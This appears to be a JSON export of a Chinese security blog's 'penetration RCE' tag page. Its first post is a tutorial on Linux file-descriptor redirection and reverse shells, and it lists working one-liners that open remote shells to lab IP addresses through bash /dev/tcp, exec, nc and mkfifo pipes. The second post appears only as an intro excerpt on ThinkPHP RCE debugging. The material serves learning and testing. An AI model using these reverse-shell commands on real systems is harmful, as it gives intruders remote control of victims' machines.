{"name":"渗透 RCE","slug":"渗透-RCE","count":2,"postlist":[{"title":"Linux反弹shell小结","slug":"ReverseShell","date":"2021-03-07T14:19:20.000Z","updated":"2021-03-07T15:01:40.503Z","comments":true,"path":"api/articles/ReverseShell.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210307223405682.png","content":"<h1 id=\"linux一切皆文件\"><a class=\"markdownIt-Anchor\" href=\"#linux一切皆文件\"></a> Linux一切皆文件</h1>\n<p>Linux文件描述符：linux跟踪打开文件后返回一个句柄，通过这个句柄可以实现读写操作。</p>\n<p>Linux启动时会默认打开三个文件描述符，分别为：</p>\n<ul>\n<li>标准输入 stdin\t\t0 （默认设备键盘）</li>\n<li>标准输出 stdout     1 （默认设备显示器）</li>\n<li>错误输出 stderr      2 （默认设备显示器）</li>\n</ul>\n<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>\n<ul>\n<li>输入重定向： &lt;&lt;</li>\n<li>输出重定向： &gt;&gt;</li>\n</ul>\n<p>还有就是&gt;&amp;这个符号的含义:</p>\n<ul>\n<li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li>\n<li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li>\n</ul>\n<h1 id=\"linux反弹shell原理\"><a class=\"markdownIt-Anchor\" href=\"#linux反弹shell原理\"></a> Linux反弹shell原理</h1>\n<p>bash反弹shell命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>命令中，bash -i 产生一个交互式shell</p>\n<p>&gt;&amp;/dev/tcp/192.168.5.3/6666 建立tcp连接，将标准输出和错误输出重定向到socket套接字上。</p>\n<p>0&gt;&amp;1 将标准输入重定向到标准输出，也就是最终重定向到了tcp连接中</p>\n<h2 id=\"小实验\"><a class=\"markdownIt-Anchor\" href=\"#小实验\"></a> 小实验</h2>\n<p>我们去掉stdin的重定向，假设我们从主机A向主机B反弹shell：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307223405682.png\" alt=\"image-20210307223405682\" /></p>\n<p>输入只能在A主机的shell中输入，而所有输出都在B主机上才可以看到。（就是B主机不能写命令了）</p>\n<p>换个方向，只重定向stdin：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307224319957.png\" alt=\"image-20210307224319957\" /></p>\n<p>那就只能B主机输入命令，A主机查看回显结果</p>\n<h1 id=\"常见反弹shell方法\"><a class=\"markdownIt-Anchor\" href=\"#常见反弹shell方法\"></a> 常见反弹shell方法</h1>\n<p>bash反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</span><br><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>exec绑定反弹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br><span class=\"line\">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>\n<p>nc反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;sh 192.168.146.129 8000 </span><br><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f</span><br><span class=\"line\">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br><span class=\"line\">nc 192.168.146.129 9000|&#x2F;bin&#x2F;bash|nc192.168.146.129 8000</span><br></pre></td></tr></table></figure>\n<h1 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\"></a> Reference</h1>\n<p><a href=\"https://www.cnblogs.com/-qing-/p/11247720.html\">https://www.cnblogs.com/-qing-/p/11247720.html</a></p>\n","text":" Linux一切皆文件Linux文件描述符：linux跟踪打开文件后返回一个句柄，通过这个句柄可以实现读写操作。Linux启动时会默认打开三个文件描述符，分别为：标准输入 stdin\t\t0 （默认设备键盘）标准输出 stdout     1 （默认设备显示器）错误输出 stder","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 RCE","slug":"渗透-RCE","count":2,"path":"api/tags/渗透-RCE.json"}]},{"title":"ThinkPHP系列——控制器过滤不严导致RCE调试及详细分析","slug":"thinkphp1","date":"2021-03-09T01:28:51.000Z","updated":"2021-03-09T06:25:27.853Z","comments":true,"path":"api/articles/thinkphp1.json","excerpt":"<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\"></a> 前言</h1>\n<p>ThinkPHP是许多中小型企业用于网站开发的国产cms，在2019年出现过多个RCE，本人此前没有过动态调试PHP代码的经验，在本文中记录配置和使用过程供大家学习参考。</p>\n<p>本文所有环境于ArchLinux系统搭建，其他系统配置方法大同小异。</p>","keywords":null,"cover":"../static/images/image-20210309095347435.png","content":null,"text":" 前言ThinkPHP是许多中小型企业用于网站开发的国产cms，在2019年出现过多个RCE，本人此前没有过动态调试PHP代码的经验，在本文中记录配置和使用过程供大家学习参考。本文所有环境于ArchLinux系统搭建，其他系统配置方法大同小异。 配置Nginx + PHP 7.3","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 RCE","slug":"渗透-RCE","count":2,"path":"api/tags/渗透-RCE.json"}]}]}